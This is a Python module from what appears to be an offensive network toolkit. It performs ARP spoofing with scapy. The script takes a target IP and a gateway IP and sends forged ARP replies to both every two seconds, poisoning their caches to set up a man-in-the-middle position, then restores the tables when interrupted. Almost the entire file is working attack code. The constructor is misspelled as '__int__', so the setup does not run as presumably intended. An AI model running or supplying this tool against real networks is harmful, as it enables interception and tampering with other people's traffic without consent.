#!/usr/bin/python3

from assets.banners import arpspoof_banner
from assets.colors import *
from assets.designs import logo, author
from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, gateway_prefix
from assets.properties import clear_screen
from assets.shortcuts import Exit
from .network import Network
import os
import scapy.all as scapy
import time
import sys


class ARPSpoof:
    def __int__(self):
        self.configuration()
        self.process()

    def header(self):
        os.system(clear_screen)
        print(logo)
        print(arpspoof_banner)
        print(author)

    def configuration(self):
        try:
            self.header()
            print('Configuration:')
            print('\n\tRHOST = Target IP')
            print('\tExample: 192.168.1.133')
            print('\n\tGATEWAY = Router IP')
            print('\tExample: 192.168.1.2')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            self.rhost_set = input(rhost_prefix).lower()
            if self.rhost_set == 'z':
                Network()
            elif self.rhost_set == 'x':
                Exit()
            self.gateway_set = input(gateway_prefix).lower()
            if self.gateway_set == 'z':
                Network()
            elif self.gateway_set == 'x':
                Exit()
        except KeyboardInterrupt:
            Exit()

    def process(self):
        try:
            self.sent_packets_count = 0
            while True:
                self.spoof(self.rhost_set, self.gateway_set)
                self.spoof(self.gateway_set, self.rhost_set)
                self.sent_packets_count = self.sent_packets_count + 2
                sys.stdout.flush()
                time.sleep(2)
                self.header()
                print('Process:')
                print('\n\tStatus')
                print('\t------')
                print('\tPACKETS SENT: ' + str(self.sent_packets_count))
                print('\n\tStop: CTRL+C\n')
        except KeyboardInterrupt:
            print(GREEN + '\n[+] Resetting ARP Tables')
            self.restore(self.rhost_set, self.gateway_set)
            self.restore(self.gateway_set, self.rhost_set)
            self.result()

    def spoof(self, target_ip, spoof_ip):
        try:
            target_mac = self.get_mac(target_ip)
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)
        except IndexError:
            print(invalid_input_prefix)
            os.system('sleep 1')
            ARPSpoof()

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

    def result(self):
        try:
            self.header()
            print('Result:')
            print('\n\tRHOST: ' + self.rhost_set)
            print('\tGATEWAY: ' + self.gateway_set)
            print('\n\tPACKETS SENT: ' + str(self.sent_packets_count))
            print('\n\tY): New')
            print('\tZ): Menu')
            print('\tX): Exit\n')
            while True:
                cmd = input(eagleshell_prefix).lower()
                if cmd == 'y':
                    ARPSpoof()
                elif cmd == 'z':
                    Network()
                elif cmd == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()
